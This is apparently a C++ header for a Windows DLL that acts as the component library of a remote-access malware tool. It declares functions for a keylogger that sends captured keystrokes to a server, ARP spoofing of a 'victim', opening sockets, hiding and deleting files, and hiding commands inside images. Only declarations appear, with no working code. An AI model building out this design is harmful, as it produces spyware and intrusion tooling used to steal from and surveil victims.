#pragma once
#ifndef COMPONENTS_H
#define COMPONENTS_H

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdexcept>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <fstream>
#include <numeric>
#include <sstream>
#include <iterator>
#include <thread>
#include "MyFileClass.h"
#include "AES_crypto.h"
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/imgproc/imgproc.hpp>
//#include <opencv2/opencv.hpp>
using namespace cv;
using namespace std;

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
/*
	Declarations of functions which are in the export table
*/
extern "C" {
#ifdef EXPORTING_DLL
	extern __declspec(dllexport) string RunNetstat(string nothing);
	extern __declspec(dllexport) string GetAllFiles(string dir = "c:\\");
	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
	extern __declspec(dllexport) string ChangeFile(string file);
	extern __declspec(dllexport) string SpoofVictim(std::string ip);
	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
	extern __declspec(dllexport) string StartKeyLogger(string nothing);
	extern __declspec(dllexport) string StopKeyLogger(string nothing);
	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);
#else
	extern __declspec(dllexport) string RunNetstat(string nothing);
	extern __declspec(dllexport) string GetAllFiles(string dir);
	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
	extern __declspec(dllexport) string ChangeFile(string file);
	extern __declspec(dllexport) string GetArpTable();
	extern __declspec(dllexport) string SpoofVictim(std::string ip);
	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
	extern __declspec(dllexport) string StartKeyLogger(string nothing);
	extern __declspec(dllexport) string StartKeyLogger(string sharedKey);
	extern __declspec(dllexport) string StopKeyLogger(string nothing);
	extern __declspec(dllexport) string HideMessageInPicture(string fileName_and_cmd);

#endif
}

/*
Declarations of functions which are internal
*/
string exec(string cmd);
string getFilePermissions(perms p);
bool ConnectToHost(const char *PortNo, const char* IPAddress, SOCKET* s);
void CloseConnection(SOCKET s);
vector<MyFileClass> getAllFilesInDir(const string &dirPath);
string OpenSocketWithThread(std::string ip_and_port);
string HideFileOrFolder(string file);
string DeleteGivenFile(string file);
string UnHideFileOrFolder(string pathtofileorfolder);
string MoveGivenFileToDestination(string pathtofile, string Destination);
string SplitArpLine(string line);
void SpoofVictimInThread(std::string ip);
void KeyLogger();
bool SpecialKeys(int S_Key);
void SendPicture(string fileName, string cmd);
void SendKeyLoggerToServer(string sharedKey);
string EncodeTextInsideImg(string fileName, string cmd);
#endif


